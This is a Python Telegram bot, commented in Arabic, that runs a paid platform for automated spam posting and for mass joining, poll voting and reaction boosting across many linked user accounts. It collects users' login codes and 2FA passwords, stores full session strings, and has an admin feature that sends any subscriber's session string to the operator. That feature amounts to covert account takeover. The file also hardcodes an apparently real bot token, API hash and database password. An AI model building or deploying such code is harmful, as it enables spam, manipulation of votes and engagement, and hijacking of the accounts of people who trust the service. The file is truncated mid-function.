hereimport os
import asyncio
import sys
import random
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from pyrogram.errors import FloodWait, SessionPasswordNeeded
from motor.motor_asyncio import AsyncIOMotorClient

# ==========================================
# ⚙️ الإعدادات الأساسية ونظام التخزين السحابي المطور (MongoDB)
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "7966559529:AAGKxuISkLPMsK1nNxDQ4HEfvu1gHoemS7c")  
API_ID = 36923112                   
API_HASH = "7282b3c8c276df5ba29679a376c8d441"
ADMIN_ID = 8791232704              

# ضع رابط الاتصال الخاص بقاعدة بيانات MongoDB هنا (أو اربطه عبر المتغيرات البيئية للموقع المستضيف)
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://martinxxser:87912327048791232704@martinsj.thvuqrb.mongodb.net/?appName=martinsj")

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client["cloud_posting_platform"]

# تعريف المجموعات (Collections) بدلاً من الجداول المحلية
users_table = db["users"]
groups_table = db["groups"]
messages_table = db["messages"]
accounts_table = db["accounts"]
system_table = db["system_config"]

user_states = {}

# دالة لتهيئة النظام السحابي عند الإقلاع لأول مرة
async def init_system_config():
    cfg = await system_table.find_one({"_id": 1})
    if not cfg:
        await system_table.insert_one({
            "_id": 1,
            "free_trial_limit": 1,      
            "premium_limit": 10,
            "welcome_msg": "🤖 **مرحباً بك في المنصة المتقدمة للنشر ورشق المهام**\n\n📌 حالتك الحالية: `{status}`\n📅 صلاحية الحساب: `{expire}`",
            "btn_post_engine": "📡 محرك النشر التلقائي",
            "btn_start_post": "▶️ تشغيل النشر",
            "btn_stop_post": "⏸️ إيقاف النشر",
            "btn_manage_msgs": "📝 إدارة الرسائل",
            "btn_manage_groups": "👥 مجموعات النشر",
            "btn_manage_accs": "📱 الحسابات المربوطة",
            "btn_tasks_menu": "🚀 قسم التحكم والرشق",
            "banned_users": []
        })

# ==========================================
# 🛡️ نظام التحقق من الصلاحيات والحظر
# ==========================================
async def check_user_status(user_id):
    config = await system_table.find_one({"_id": 1})
    if not config:
        return {"status": "guest", "max_accs": 0, "active": False}
        
    if user_id in config.get("banned_users", []):
        return {"status": "banned", "max_accs": 0, "active": False}
        
    if user_id == ADMIN_ID:
        return {"status": "admin", "max_accs": 999, "active": True}
        
    user = await users_table.find_one({"user_id": user_id})
    if not user:
        return {"status": "guest", "max_accs": 0, "active": False}
        
    expire_at = datetime.fromisoformat(user["expire_at"])
    if datetime.now() > expire_at:
        return {"status": "expired", "max_accs": 0, "active": False}
        
    return {"status": user["plan"], "max_accs": user["max_accs"], "active": True}

app = Client("CloudPremiumPostBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ==========================================
# 🎛️ بناء لوحة التحكم المخصصة والديناميكية
# ==========================================
async def main_menu_keyboard(user_id):
    status = await check_user_status(user_id)
    cfg = await system_table.find_one({"_id": 1})
    kb = []
    
    if status["status"] == "banned":
        return InlineKeyboardMarkup([[InlineKeyboardButton("❌ حسابك محظور", callback_data="none")]])
        
    if status["active"] or user_id == ADMIN_ID:
        user_data = await users_table.find_one({"user_id": user_id})
        is_user_posting = user_data.get("is_posting", False) if user_data else False
        post_icon = "🟢 يعمل" if is_user_posting else "🔴 متوقف"
        current_interval = user_data.get("posting_interval", 60) if user_data else 60
        num_post_accs = user_data.get("num_post_accs", "الكل")
        
        kb.append([InlineKeyboardButton(f"{cfg.get('btn_post_engine', '📡 محرك النشر')}: {post_icon}", callback_data="u_view_status")])
        kb.append([
            InlineKeyboardButton(cfg.get('btn_start_post', '▶️ تشغيل النشر'), callback_data="start_user_post"),
            InlineKeyboardButton(cfg.get('btn_stop_post', '⏸️ إيقاف النشر'), callback_data="stop_user_post")
        ])
        kb.append([
            InlineKeyboardButton(f"⏱️ التوقيت: {current_interval}ث", callback_data="u_set_interval"),
            InlineKeyboardButton(f"🔢 أرقام النشر: {num_post_accs}", callback_data="u_set_post_accs")
        ])
        kb.append([
            InlineKeyboardButton(cfg.get('btn_manage_msgs', '📝 إدارة الرسائل'), callback_data="u_manage_msgs"), 
            InlineKeyboardButton(cfg.get('btn_manage_groups', '👥 مجموعات النشر'), callback_data="u_manage_groups")
        ])
        kb.append([
            InlineKeyboardButton(cfg.get('btn_manage_accs', '📱 الحسابات المربوطة'), callback_data="u_manage_accs"), 
            InlineKeyboardButton(cfg.get('btn_tasks_menu', '🚀 قسم التحكم والرشق'), callback_data="u_tasks_menu")
        ])
    else:
        kb.append([InlineKeyboardButton("🎁 تفعيل التجربة المجانية (ساعة)", callback_data="activate_free_trial")])
        kb.append([InlineKeyboardButton("💳 تفعيل الحساب والاشتراك", callback_data="view_subscription_info")])
        
    if user_id == ADMIN_ID:
        kb.append([InlineKeyboardButton("⚙️ لوحة الإدارة والتحكم المطلق ⚙️", callback_data="admin_main_panel")])
        
    return InlineKeyboardMarkup(kb)

# ==========================================
# 📡 محرك النشر التلقائي الذكي سحابياً عبر MongoDB
# ==========================================
async def user_individual_post_loop(uid):
    while True:
        try:
            user_data = await users_table.find_one({"user_id": uid})
            if uid != ADMIN_ID:
                if not user_data or not user_data.get("is_posting", False): break
                if datetime.now() > datetime.fromisoformat(user_data["expire_at"]):
                    await users_table.update_one({"user_id": uid}, {"$set": {"is_posting": False}})
                    break
            else:
                if not user_data or not user_data.get("is_posting", False): break

            sleep_interval = user_data.get("posting_interval", 60)
            
            # سحب البيانات غير المتزامن من MongoDB
            u_groups = await groups_table.find({"user_id": uid}).to_list(length=500)
            u_messages = await messages_table.find({"user_id": uid}).to_list(length=500)
            all_accounts = await accounts_table.find({"user_id": uid}).to_list(length=100)
            
            num_accs_setting = user_data.get("num_post_accs", "الكل")
            if num_accs_setting != "الكل":
                try: target_accounts = all_accounts[:int(num_accs_setting)]
                except Exception: target_accounts = all_accounts
            else:
                target_accounts = all_accounts

            if u_groups and u_messages and target_accounts:
                for grp in u_groups:
                    chk = await users_table.find_one({"user_id": uid})
                    if not chk or not chk.get("is_posting", False): break
                    
                    msg_to_send = random.choice(u_messages)["text"]
                    chosen_acc = random.choice(target_accounts)
                    try:
                        assistant = Client("h_session", api_id=API_ID, api_hash=API_HASH, session_string=chosen_acc["session_string"], in_memory=True)
                        await assistant.connect()
                        await assistant.send_message(int(grp["group_id"]), msg_to_send)
                        await assistant.disconnect()
                        await asyncio.sleep(4) 
                    except FloodWait as e:
                        await asyncio.sleep(e.value)
                    except Exception:
                        continue
            
            await asyncio.sleep(sleep_interval)
        except Exception:
            await asyncio.sleep(10)

# ==========================================
# ⚡ معالجة الأزرار والعمليات التفاعلية
# ==========================================
@app.on_callback_query()
async def callback_handler(client: Client, query: CallbackQuery):
    uid = query.from_user.id
    data = query.data
    status = await check_user_status(uid)

    if status["status"] == "banned":
        await query.answer("❌ أنت محظور من استخدام المنصة.", show_alert=True)
        return

    if data == "main_panel":
        user_states.pop(uid, None)
        cfg = await system_table.find_one({"_id": 1})
        u_info = await users_table.find_one({"user_id": uid})
        exp_txt = f"ينتهي في: {u_info['expire_at'][:16]}" if u_info else "غير مشترك"
        if uid == ADMIN_ID: exp_txt = "🛡️ رتبة الأدمن المطلق"
        
        welcome_final = cfg.get("welcome_msg").format(status=status['status'], expire=exp_txt)
        await query.message.edit_text(welcome_final, reply_markup=await main_menu_keyboard(uid))

    elif data == "u_view_status":
        await query.answer("💡 استخدم اللوحة للتحكم في وتيرة تشغيل وإيقاف النشر التلقائي.", show_alert=True)

    elif data == "start_user_post":
        user_data = await users_table.find_one({"user_id": uid})
        if not user_data and uid == ADMIN_ID:
            await users_table.update_one(
                {"user_id": ADMIN_ID}, 
                {"$set": {"is_posting": True, "posting_interval": 60, "num_post_accs": "الكل", "expire_at": (datetime.now()+timedelta(days=365)).isoformat()}}, 
                upsert=True
            )
            user_data = await users_table.find_one({"user_id": uid})

        if user_data:
            if user_data.get("is_posting", False):
                await query.answer("🟢 محرك النشر قيد العمل بالفعل!", show_alert=True)
            else:
                await users_table.update_one({"user_id": uid}, {"$set": {"is_posting": True}})
                asyncio.create_task(user_individual_post_loop(uid))
                await query.answer("🚀 تم بدء تشغيل محرك النشر بنجاح!", show_alert=True)
                await callback_handler(client, query)
        else:
            await query.answer("❌ لا تمتلك اشتراك فعال لبدء النشر.", show_alert=True)

    elif data == "stop_user_post":
        user_data = await users_table.find_one({"user_id": uid})
        if user_data:
            if not user_data.get("is_posting", False):
                await query.answer("🛑 النظام متوقف حالياً!", show_alert=True)
            else:
                await users_table.update_one({"user_id": uid}, {"$set": {"is_posting": False}})
                await query.answer("⏸️ تم إيقاف عملية النشر بنجاح.", show_alert=True)
                await callback_handler(client, query)

    elif data == "u_set_interval":
        if not status["active"] and uid != ADMIN_ID: return
        user_states[uid] = {"state": "U_EXP_INTERVAL"}
        await query.message.edit_text("⏱ **ضبط توقيت النشر التلقائي:**\n\nأرسل الآن الوقت المطلوب بالثواني:")

    elif data == "u_set_post_accs":
        if not status["active"] and uid != ADMIN_ID: return
        user_states[uid] = {"state": "U_EXP_POST_ACCS"}
        await query.message.edit_text("🔢 **تحديد عدد حسابات النشر:**\n\nأدخل عدد الحسابات المسموح لها بالنشر، أو أرسل `الكل`:")

    elif data == "activate_free_trial":
        if await users_table.find_one({"user_id": uid}):
            await query.answer("❌ لقد استهلكت الفترة التجريبية سابقاً!", show_alert=True)
            return
        sys_settings = await system_table.find_one({"_id": 1})
        await users_table.insert_one({
            "user_id": uid, "plan": "free_trial", "max_accs": sys_settings.get("free_trial_limit", 1),
            "posting_interval": 60, "num_post_accs": "الكل", "expire_at": (datetime.now() + timedelta(hours=1)).isoformat(), "is_posting": False
        })
        await callback_handler(client, query)

    elif data == "view_subscription_info":
        await query.message.edit_text(f"💳 **طرق الاشتراك وتفعيل الحساب:**\n\nيرجى تزويد المطور بالآيدي لتفعيل حسابك.\n\n👤 آيديك الحالي: `{uid}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 عودة", callback_data="main_panel")]]))

    elif data == "u_manage_msgs":
        if not status["active"] and uid != ADMIN_ID: return
        msgs = await messages_table.find({"user_id": uid}).to_list(length=500)
        txt = "📝 **قائمة رسائل النشر المضافة:**\n\n"
        kb = []
        for index, m in enumerate(msgs, start=1):
            short_text = m["text"][:30] + "..." if len(m["text"]) > 30 else m["text"]
            txt += f"{index} - `{short_text}`\n"
            kb.append([InlineKeyboardButton(f"❌ حذف الرسالة {index}", callback_data=f"u_del_msg_{str(m['_id'])}")])
        kb.append([InlineKeyboardButton("➕ إضافة رسالة جديدة", callback_data="u_add_msg"), InlineKeyboardButton("🔙 عودة", callback_data="main_panel")])
        await query.message.edit_text(txt if msgs else "ℹ️ لا توجد رسائل محفوظة حالياً.", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "u_add_msg":
        user_states[uid] = {"state": "U_EXP_MSG"}
        await query.message.edit_text("📥 **أرسل نص الرسالة الجديدة:**")

    elif data.startswith("u_del_msg_"):
        from bson import ObjectId
        obj_id = ObjectId(data.replace("u_del_msg_", ""))
        await messages_table.delete_one({"_id": obj_id})
        query.data = "u_manage_msgs"
        await callback_handler(client, query)

    elif data == "u_manage_groups":
        if not status["active"] and uid != ADMIN_ID: return
        grps = await groups_table.find({"user_id": uid}).to_list(length=500)
        txt = "👥 **قائمة مجموعات النشر المستهدفة:**\n\n"
        kb = []
        for index, g in enumerate(grps, start=1):
            txt += f"{index} - {g['title']} (`{g['group_id']}`)\n"
            kb.append([InlineKeyboardButton(f"❌ إزالة مجموعة {index}", callback_data=f"u_del_grp_{str(g['_id'])}")])
        kb.append([InlineKeyboardButton("➕ إضافة مجموعة جديدة", callback_data="u_add_grp"), InlineKeyboardButton("🔙 عودة", callback_data="main_panel")])
        await query.message.edit_text(txt if grps else "ℹ️ لا توجد مجموعات مضافة حالياً.", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "u_add_grp":
        user_states[uid] = {"state": "U_EXP_GRP"}
        await query.message.edit_text("📥 **أرسل معرف المجموعة العامة (@Group) أو الآيدي الرقمي للمجموعة الخاصة:**")

    elif data.startswith("u_del_grp_"):
        from bson import ObjectId
        obj_id = ObjectId(data.replace("u_del_grp_", ""))
        await groups_table.delete_one({"_id": obj_id})
        query.data = "u_manage_groups"
        await callback_handler(client, query)

    elif data == "u_manage_accs":
        if not status["active"] and uid != ADMIN_ID: return
        accs = await accounts_table.find({"user_id": uid}).to_list(length=100)
        txt = f"📱 **الحسابات المربوطة بالمنصة ({len(accs)}/{status['max_accs']}):**\n\n"
        kb = []
        for idx, acc in enumerate(accs, start=1):
            txt += f"{idx} - الحساب: `{acc['phone']}`\n"
            kb.append([InlineKeyboardButton(f"❌ حذف الرقم {idx}", callback_data=f"u_del_acc_{str(acc['_id'])}")])
        if len(accs) < status["max_accs"]:
            kb.append([InlineKeyboardButton("➕ ربط رقم هاتف جديد", callback_data="u_add_acc")])
        kb.append([InlineKeyboardButton("🔙 العودة للرئيسية", callback_data="main_panel")])
        await query.message.edit_text(txt if accs else "ℹ️ لم تقم بربط أي حساب حتى الآن.", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "u_add_acc":
        user_states[uid] = {"state": "U_EXP_PHONE"}
        await query.message.edit_text("📱 **أدخل رقم الهاتف مع رمز الدولة (مثال: `+964...`):**")

    elif data.startswith("u_del_acc_"):
        from bson import ObjectId
        obj_id = ObjectId(data.replace("u_del_acc_", ""))
        await accounts_table.delete_one({"_id": obj_id})
        query.data = "u_manage_accs"
        await callback_handler(client, query)

    elif data == "u_tasks_menu":
        accs_count = await accounts_table.count_documents({"user_id": uid})
        if accs_count == 0:
            await query.answer("⚠️ يجب إضافة رقم هاتف واحد على الأقل أولاً!", show_alert=True)
            return
        kb = [
            [InlineKeyboardButton("📢 متابعة قنوات ومجموعات", callback_data="u_task_join")],
            [InlineKeyboardButton("📊 تصويت جماعي على منشور", callback_data="u_task_vote")],
            [InlineKeyboardButton("🔥 رشق تفاعلات (Reactions)", callback_data="u_task_react")],
            [InlineKeyboardButton("🔙 العودة للرئيسية", callback_data="main_panel")]
        ]
        await query.message.edit_text("🚀 **قسم التحكم وتوجيه الحسابات التلقائي:**", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "u_task_join": user_states[uid] = {"state": "U_JOIN_1"}; await query.message.edit_text("📥 أرسل معرف القناة أو رابطها العام للمتابعة:")
    elif data == "u_task_vote": user_states[uid] = {"state": "U_VOTE_1"}; await query.message.edit_text("📥 أرسل رابط الرسالة المحتوية على التصويت:")
    elif data == "u_task_react": user_states[uid] = {"state": "U_REACT_1"}; await query.message.edit_text("📥 أرسل رابط الرسالة المراد التفاعل معها:")

    # ==========================================
    # 👑 لوحة تحكم الأدمن المتقدمة
    # ==========================================
    elif data == "admin_main_panel" and uid == ADMIN_ID:
        cfg = await system_table.find_one({"_id": 1})
        users_count = await users_table.count_documents({})
        accs_count = await accounts_table.count_documents({})
        adm_txt = (
            "🛡️ **لوحة التحكم المطلقة للمطور**\n\n"
            f"📊 إجمالي المستخدمين: `{users_count}` مستخدم\n"
            f"📱 إجمالي الحسابات المربوطة: `{accs_count}` رقم\n"
            f"🚫 إجمالي المحظورين: `{len(cfg.get('banned_users', []))}` مستخدم"
        )
        kb = [
            [InlineKeyboardButton("➕ تفعيل / تجديد مستخدم يدوياً", callback_data="adm_activate_user")],
            [InlineKeyboardButton("🔍 فحص مستخدم وسحب الجلسات", callback_data="adm_inspect_user")],
            [InlineKeyboardButton("🚫 حظر مستخدم", callback_data="adm_ban_click"), InlineKeyboardButton("🟢 فك حظر مستخدم", callback_data="adm_unban_click")],
            [InlineKeyboardButton("📝 تعديل كلي لرسالة الترحيب", callback_data="adm_change_welcome")],
            [InlineKeyboardButton("🎛️ إدارة وتغيير أسماء الأزرار", callback_data="adm_manage_buttons")],
            [InlineKeyboardButton("🔙 العودة للقائمة", callback_data="main_panel")]
        ]
        await query.message.edit_text(adm_txt, reply_markup=InlineKeyboardMarkup(kb))

    elif data == "adm_ban_click" and uid == ADMIN_ID:
        user_states[uid] = {"state": "ADM_EXP_BAN_ID"}
        await query.message.edit_text("📥 **أرسل آيدي (User ID) المستخدم المراد حظره نهائياً:**")

    elif data == "adm_unban_click" and uid == ADMIN_ID:
        user_states[uid] = {"state": "ADM_EXP_UNBAN_ID"}
        await query.message.edit_text("📥 **أرسل آيدي (User ID) المستخدم المراد إلغاء الحظر عنه:**")

    elif data == "adm_change_welcome" and uid == ADMIN_ID:
        cfg = await system_table.find_one({"_id": 1})
        user_states[uid] = {"state": "ADM_EXP_WELCOME"}
        await query.message.edit_text(
            "📝 **أرسل كود أو نص الترحيب الجديد:**\n\n"
            "يمكنك استخدام المتغيرات التالية ليتم تعويضها تلقائياً:\n"
            "`{status}` للتعبير عن رتبة المشترك.\n"
            "`{expire}` للتعبير عن تاريخ الانتهاء.\n\n"
            f"النص الحالي:\n`{cfg.get('welcome_msg')}`"
        )

    elif data == "adm_manage_buttons" and uid == ADMIN_ID:
        kb = [
            [InlineKeyboardButton("تعديل 'محرك النشر'", callback_data="btn_edit_post_engine")],
            [InlineKeyboardButton("تعديل 'تشغيل النشر'", callback_data="btn_edit_start_post")],
            [InlineKeyboardButton("تعديل 'إيقاف النشر'", callback_data="btn_edit_stop_post")],
            [InlineKeyboardButton("تعديل 'إدارة الرسائل'", callback_data="btn_edit_manage_msgs")],
            [InlineKeyboardButton("تعديل 'مجموعات النشر'", callback_data="btn_edit_manage_groups")],
            [InlineKeyboardButton("تعديل 'الحسابات المربوطة'", callback_data="btn_edit_manage_accs")],
            [InlineKeyboardButton("تعديل 'قسم الرشق'", callback_data="btn_edit_tasks_menu")],
            [InlineKeyboardButton("🔙 عودة للوحة", callback_data="admin_main_panel")]
        ]
        await query.message.edit_text("🎛️ **اختر الزر الذي تريد إعادة تسميته وتخصيصه:**", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("btn_edit_") and uid == ADMIN_ID:
        target_key = data.replace("btn_edit_", "btn_")
        user_states[uid] = {"state": "ADM_EXP_BTN_NAME", "key": target_key}
        await query.message.edit_text("📥 **أرسل الآن الاسم الجديد المُراد وضعه على الزر:**")

    elif data == "adm_activate_user" and uid == ADMIN_ID:
        user_states[uid] = {"state": "ADM_EXP_USER_ID"}
        await query.message.edit_text("📥 **أرسل آيدي (User ID) المستخدم المراد تفعيله:**")

    elif data == "adm_inspect_user" and uid == ADMIN_ID:
        user_states[uid] = {"state": "ADM_INSPECT_ID"}
        await query.message.edit_text("🔍 أرسل آيدي المستخدم للاطلاع على أرقامه وسحب الجلسات:")

    elif data.startswith("adm_extract_") and uid == ADMIN_ID:
        from bson import ObjectId
        obj_id = ObjectId(data.replace("adm_extract_", ""))
        acc_data = await accounts_table.find_one({"_id": obj_id})
        if acc_data:
            await app.send_message(ADMIN_ID, f"📱 **كود الـ Session المربوط للرقم {acc_data['phone']}:**\n\n`{acc_data['session_string']}`")
            await query.answer("✅ تم سحب الجلسة بنجاح وإرسالها إليك خاص!", show_alert=True)
        else:
            await query.answer("❌ تعذر العثور على بيانات هذا الرقم.", show_alert=True)

# ==========================================
# 📝 استقبال النصوص ومعالجة القيود سحابياً
# ==========================================
@app.on_message(filters.private & filters.text)
async def text_message_handler(client: Client, message: Message):
    uid = message.from_user.id
    text = message.text.strip()
    status = await check_user_status(uid)

    if status["status"] == "banned":
        await message.reply_text("❌ عذراً، لقد تم حظر حسابك من قبل إدارة النظام.")
        return

    if text == "/start":
        user_states.pop(uid, None)
        cfg = await system_table.find_one({"_id": 1})
        u_info = await users_table.find_one({"user_id": uid})
        exp_txt = f"ينتهي في: {u_info['expire_at'][:16]}" if u_info else "غير مشترك"
        if uid == ADMIN_ID: exp_txt = "🛡️ رتبة الأدمن المطلق"
        
        welcome_final = cfg.get("welcome_msg").format(status=status['status'], expire=exp_txt)
        await message.reply_text(welcome_final, reply_markup=await main_menu_keyboard(uid))
        return

    if uid in user_states:
        state = user_states[uid].get("state")

        if state == "U_EXP_INTERVAL" and (status["active"] or uid == ADMIN_ID):
            try:
                seconds = int(text)
                if seconds < 5:
                    await message.reply_text("⚠️ يرجى تعيين 5 ثوانٍ أو أكثر.")
                    return
                user_states.pop(uid, None)
                await users_table.update_one({"user_id": uid}, {"$set": {"posting_interval": seconds}})
                await message.reply_text(f"⚙️ **تم تعديل فواصل النشر بنجاح إلى {seconds} ثانية.**", reply_markup=await main_menu_keyboard(uid))
            except ValueError: await message.reply_text("❌ يرجى إرسال رقم صحيح بالثواني.")

        elif state == "U_EXP_POST_ACCS" and (status["active"] or uid == ADMIN_ID):
            user_states.pop(uid, None)
            val = "الكل" if text == "الكل" else text
            if val != "الكل":
                try: val = str(int(text))
                except ValueError: await message.reply_text("❌ إدخال خاطئ."); return
            await users_table.update_one({"user_id": uid}, {"$set": {"num_post_accs": val}})
            await message.reply_text(f"⚙️ تم تحديد تشغيل النشر لعدد حسابات: `{val}`", reply_markup=await main_menu_keyboard(uid))

        elif state == "U_EXP_MSG" and (status["active"] or uid == ADMIN_ID):
            user_states.pop(uid, None)
            await messages_table.insert_one({"user_id": uid, "text": text})
            await message.reply_text("✅ تم حفظ رسالة النشر بنجاح!", reply_markup=await main_menu_keyboard(uid))

        elif state == "U_EXP_GRP" and (status["active"] or uid == ADMIN_ID):
            user_states.pop(uid, None)
            st_msg = await message.reply_text("⏳ جاري فحص معطيات المجموعة...")
            
            input_target = text
            if input_target.startswith("-100"):
                try: input_target = int(input_target)
                except ValueError: pass

            try:
                chat = await client.get_chat(input_target)
                await groups_table.update_one(
                    {"user_id": uid, "group_id": int(chat.id)},
                    {"$set": {"title": chat.title, "username": chat.username}},
                    upsert=True
                )
                await st_msg.edit_text(f"✅ **تم ربط وتحديث المجموعة بنجاح!**\nالاسم: **{chat.title}**\nالآيدي: `{chat.id}`", reply_markup=await main_menu_keyboard(uid))
            except Exception:
                if isinstance(input_target, int) or str(input_target).startswith("-100"):
                    await groups_table.update_one(
                        {"user_id": uid, "group_id": int(input_target)},
                        {"$set": {"title": "مجموعة مضافة (يدوياً)", "username": None}},
                        upsert=True
                    )
                    await st_msg.edit_text(f"⚠️ تم تخطي الفحص والربط المباشر بنجاح للآيدي: `{input_target}`", reply_markup=await main_menu_keyboard(uid))
                else:
                    await st_msg.edit_text("❌ تعذر الوصول للمجموعة، تأكد من المعرف أو الآيدي.", reply_markup=await main_menu_keyboard(uid))

        # --- ربط الحسابات وسحب الجلسة سحابياً ---
        elif state == "U_EXP_PHONE" and (status["active"] or uid == ADMIN_ID):
            user_states.pop(uid, None)
            await message.reply_text("⏳ جاري إرسال رمز التحقق من تليجرام...")
            try:
                t_cli = Client("u_cloud_temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
                await t_cli.connect()
                s_code = await t_cli.send_code(text.replace(" ", ""))
                user_states[uid] = {"state": "U_EXP_CODE", "phone": text, "hash": s_code.phone_code_hash, "client": t_cli}
                await message.reply_text("📥 أرسل كود التحقق بوضع مسافات بين الأرقام (مثال: `1 2 3 4 5`):")
            except Exception as e: await message.reply_text(f"❌ فشل إرسال الرمز: {e}", reply_markup=await main_menu_keyboard(uid))

        elif state == "U_EXP_CODE" and (status["active"] or uid == ADMIN_ID):
            otp = text.replace(" ", "")
            p_info = user_states[uid]
            user_states.pop(uid, None)
            try:
                user = await p_info["client"].sign_in(p_info["phone"], p_info["hash"], otp)
                s_str = await p_info["client"].export_session_string()
                await p_info["client"].disconnect()
                await accounts_table.update_one(
                    {"user_id": uid, "phone": p_info["phone"]},
                    {"$set": {"user_id_tg": user.id, "session_string": s_str}},
                    upsert=True
                )
                await message.reply_text(f"🎉 تم ربط وحفظ الحساب `{p_info['phone']}` بنجاح!", reply_markup=await main_menu_keyboard(uid))
            except SessionPasswordNeeded:
                user_states[uid] = p_info
                user_states[uid]["state"] = "U_EXP_2FA"
                await message.reply_text("🔐 الحساب محمي بالتحقق بخطوتين، أرسل الباسوورد الآن:")
            except Exception as e:
                await message.reply_text(f"❌ خطأ: {e}", reply_markup=await main_menu_keyboard(uid))
                await p_info["client"].disconnect()

        elif state == "U_EXP_2FA" and (status["active"] or uid == ADMIN_ID):
            p_info = user_states[uid]
            user_states.pop(uid, None)
            try:
                await p_info["client"].check_password(text)
                user = await p_info["client"].get_me()
                s_str = await p_info["client"].export_session_string()
                await p_info["client"].disconnect()
                await accounts_table.update_one(
                    {"user_id": uid, "phone": p_info["phone"]},
                    {"$set": {"user_id_tg": user.id, "session_string": s_str}},
                    upsert=True
                )
                await message.reply_text(f"🎉 تم ربط الحساب وتخطي الـ 2FA بنجاح!", reply_markup=await main_menu_keyboard(uid))
            except Exception as e:
                await message.reply_text(f"❌ الباسوورد غير صحيح: {e}", reply_markup=await main_menu_keyboard(uid))
                await p_info["client"].disconnect()

        # ==========================================
        # 🚀 معالجة مهام الرشق المباشر
        # ==========================================
        elif state == "U_JOIN_1":
            user_states[uid] = {"state": "U_JOIN_2", "target": text}
            await message.reply_text("🔢 كم حساب تريد أن ينضم؟ (أدخل الرقم الصافي أو `الكل`):")
        elif state == "U_JOIN_2":
            target = user_states[uid]["target"]
            user_states.pop(uid, None)
            accs = await accounts_table.find({"user_id": uid}).to_list(length=100)
            if text != "الكل":
                try: accs = accs[:int(text)]
                except ValueError: await message.reply_text("❌ إدخال خاطئ."); return
            st_msg = await message.reply_text("⏳ جاري تنفيذ الانضمام التلقائي للمجموعات...")
            success, failed = 0, 0
            for acc in accs:
                try:
                    cli = Client("t_cli", api_id=API_ID, api_hash=API_HASH, session_string=acc["session_string"], in_memory=True)
                    await cli.connect()
                    await cli.join_chat(target)
                    await cli.disconnect()
                    success += 1
                except Exception: failed += 1
            await st_msg.edit_text(f"📊 **انتهاء مهمة الانضمام:**\n\n✅ ناجح: {success}\n❌ فشل: {failed}", reply_markup=await main_menu_keyboard(uid))

        elif state == "U_VOTE_1":
            user_states[uid] = {"state": "U_VOTE_2", "url": text}
            await message.reply_text("🔢 أرسل رقم خيار التصويت المطلوب (1 أو 2 أو 3):")
        elif state == "U_VOTE_2":
            try:
                user_states[uid]["opt"] = int(text) - 1
                user_states[uid]["state"] = "U_VOTE_3"
                await message.reply_text("🔢 كم حساب تود تشغيله للتصويت؟ (أدخل العدد أو `الكل`):")
            except (ValueError, KeyError):
                user_states.pop(uid, None)
                await message.reply_text("❌ حدث خطأ في الإدخال، يرجى المحاولة مجدداً.")

        elif state == "U_VOTE_3":
            p_info = user_states[uid]
            user_states.pop(uid, None)
            try:
                parts = p_info["url"].split('/')
                chat_t = parts[-2]
                m_id = int(parts[-1])
                if chat_t.isdigit(): chat_t = int(f"-100{chat_t}")
            except Exception: await message.reply_text("❌ خطأ في هيكلية الرابط."); return
            accs = await accounts_table.find({"user_id": uid}).to_list(length=100)
            if text != "الكل":
                try: accs = accs[:int(text)]
                except ValueError: pass
            success = 0
            for acc in accs:
                try:
                    cli = Client("t_cli", api_id=API_ID, api_hash=API_HASH, session_string=acc["session_string"], in_memory=True)
                    await cli.connect()
                    await cli.vote_poll(chat_t, m_id, [p_info["opt"]])
                    await cli.disconnect()
                    success += 1
                except Exception: continue
            await message.reply_text(f"📊 تم التصويت بنجاح عبر `{success}` حساب!", reply_markup=await main_menu_keyboard(uid))

        elif state == "U_REACT_1":
            user_states[uid] = {"state": "U_REACT_2", "url": text}
            await message.reply_text("📥 أرسل إيموجي التفاعل (👍, 🔥, ❤️):")
        elif state == "U_REACT_2":
            if uid in user_states:
                user_states[uid]["emoji"] = text
                user_states[uid]["state"] = "U_REACT_3"
                await message.reply_text("🔢 كم حساب يضع التفاعل؟ (أدخل العدد أو `الكل`):")
        elif state == "U_REACT_3":
            p_info = user_states[uid]
            user_states.pop(uid, None)
            try:
                parts = p_info["url"].split('/')
                chat_t = parts[-2]
                m_id = int(parts[-1])
                if chat_t.isdigit(): chat_t = int(f"-100{chat_t}")
            except Exception: await message.reply_text("❌ خطأ في الرابط."); return
            accs = await accounts_table.find({"user_id": uid}).to_list(length=100)
            if text != "الكل":
                try: accs = accs[:int(text)]
                except ValueError: pass
            success = 0
            for acc in accs:
                try:
                    cli = Client("t_cli", api_id=API_ID, api_hash=API_HASH, session_string=acc["session_string"], in_memory=True)
                    await cli.connect()
                    await cli.send_reaction(chat_t, m_id, p_info["emoji"])
                    await cli.disconnect()
                    success += 1
                except Exception: continue
            await message.reply_text(f"📊 تم رشق التفاعل عبر `{success}` حساب بنجاح!", reply_markup=await main_menu_keyboard(uid))

        # ==========================================
        # 👑 معالجة أوامر الإدارة الفوقية للأدمن
        # ==========================================
        elif state == "ADM_EXP_BAN_ID" and uid == ADMIN_ID:
            user_states.pop(uid, None)
            try:
                ban_id = int(text)
                cfg = await system_table.find_one({"_id": 1})
                current_bans = cfg.get("banned_users", [])
                if ban_id not in current_bans:
                    current_bans.append(ban_id)
                    await system_table.update_one({"_id": 1}, {"$set": {"banned_users": current_bans}})
                    await users_table.update_one({"user_id": ban_id}, {"$set": {"is_posting": False}})
                    await message.reply_text(f"🚫 تم حظر المستخدم بنجاح وتقييد وصوله السحابي: `{ban_id}`")
                else:
                    await message.reply_text("ℹ️ هذا المستخدم محظور مسبقاً في النظام.")
            except ValueError: await message.reply_text("❌ يرجى إرسال آيدي رقمي صحيح.")

        elif state == "ADM_EXP_UNBAN_ID" and uid == ADMIN_ID:
            user_states.pop(uid, None)
            try:
                unban_id = int(text)
                cfg = await system_table.find_one({"_id": 1})
                current_bans = cfg.get("banned_users", [])
                if unban_id in current_bans:
                    current_bans.remove(unban_id)
                    await system_table.update_one({"_id": 1}, {"$set": {"banned_users": current_bans}})
